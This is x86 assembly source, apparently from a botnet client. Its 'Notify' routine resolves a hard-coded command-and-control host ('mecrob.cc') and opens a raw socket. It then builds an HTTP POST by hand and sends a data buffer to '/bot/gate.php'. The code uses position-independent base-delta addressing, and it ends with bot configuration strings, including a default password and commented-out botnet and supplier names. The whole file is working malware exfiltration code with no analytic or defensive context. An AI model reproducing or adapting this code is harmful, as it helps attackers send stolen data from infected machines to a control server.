
.code

;; ==================================================================================================== ;;
;; Notify -                                                                                             ;;
;; __in lpData - data ptr with its len in first dword                                                   ;;
;; ==================================================================================================== ;;
Notify proc lpData : dword
	local  lpContents    : dword
	local  dwContentsLen : dword
	local  WSAData  : WSADATA
	local  clntSrvc : sockaddr_in
	local  hSocket  : dword
	local  ReqBuff[320] : byte



	GetBaseDelta ebx


	mov  esi, lpData
	lodsd				;; data len
	mov  lpContents, esi
	mov  dwContentsLen, eax


	invokx  _WSAStartup[ebx], 202h, &WSAData
	jmpnz eax, @err


	;; Convert if IP
	invokx  _inet_addr[ebx], &szHostName[ebx]
	jmpns eax, @F

	;; Resolve if host
	invokx  _gethostbyname[ebx], &szHostName[ebx]
	jmpz eax, @err
	;; inet_addr
	mov  eax, [eax+0Ch]
	mov  eax, [eax]
	mov  eax, [eax]


@@:	mov  clntSrvc.sin_addr, eax
	mov  clntSrvc.sin_port, 5000h
	mov  clntSrvc.sin_family, AF_INET
	mov  clntSrvc.sin_zero, 0
	mov  clntSrvc.sin_zero+4, 0


	invokx  _socket[ebx], AF_INET, SOCK_STREAM, 0
	jmps eax, @err
	mov  hSocket, eax


	invokx  _connect[ebx], hSocket, &clntSrvc, sizeof clntSrvc
	jmpnz eax, @err


	invokx  &strcpyn[ebx], &ReqBuff, "POST ", 5
	invokx  &strcpyn[ebx], eax, &sResource[ebx], sizeof sResource
	invokx  &strcpyn[ebx], eax, " HTTP/1.1\r\nHost: ", 17
	invokx  &strcpyn[ebx], eax, &szHostName[ebx], sizeof szHostName-1
	invokx  &strcpyn[ebx], eax, "\r\nContent-Length: ", 18
	invokx  &dwtoa[ebx], dwContentsLen, eax
	mov  edi, eax
	mov  eax, 0A0D0A0Dh
	stosd
	lea  eax, ReqBuff
	sub  edi, eax


	invokx  _send[ebx], hSocket, &ReqBuff, edi, 0
	jmps eax, @err


	invokx  _send[ebx], hSocket, lpContents, dwContentsLen, 0
	jmps eax, @err


	invokx  _recv[ebx], hSocket, &ReqBuff, 320, 0
	jmps eax, @err


	invokx  _closesocket[ebx], hSocket


	invokx  _VirtualFree[ebx], lpData, 0, MEM_RELEASE


@err:
	xor  eax, eax
	ret
Notify endp



	szHostName db "mecrob.cc",0
	sResource  db "/bot/gate.php"


	sPassword  db "default_password"


;	sBotNET    db "default"
;	sSupplier  db "loadscc"


